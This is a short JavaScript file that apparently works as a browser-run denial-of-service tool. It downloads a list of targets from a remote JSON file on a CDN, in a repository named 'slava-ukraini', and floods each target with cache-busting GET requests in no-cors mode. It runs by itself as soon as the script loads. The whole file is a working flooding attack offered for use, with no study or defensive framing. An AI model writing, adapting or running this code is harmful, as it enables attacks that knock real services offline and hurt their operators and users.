async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);

    return fetch(resource, {
        method: "GET",
        mode: "no-cors",
        signal: controller.signal,
    })
        .then(response => {
            clearTimeout(id);
            return response;
        })
        .catch(error => {
            clearTimeout(id);
            throw error;
        })

}

async function flood(target) {
    let rand = "?" + Math.random() * 1000;
    try {
        await fetchWithTimeout(target + rand, {timeout: 1000})
            .catch(error => {
                if (error.code === 20 /* ABORT */) {
                    return;
                }
                // console.log(error)
            })
            .then(response => {
                // console.log(response)
            })
    } catch (error) {
        // Timeouts if the request takes
        // longer than 1 seconds
        console.log(error);
    }
}

async function load() {
    let url = 'https://cdn.jsdelivr.net/gh/kitas-zmogus/slava-ukraini/targets.json';
    let targets = await (await fetch(url)).json();
    for (var i = 0; i < targets.length; i++) {
        flood(targets[i])
    }
}

load();

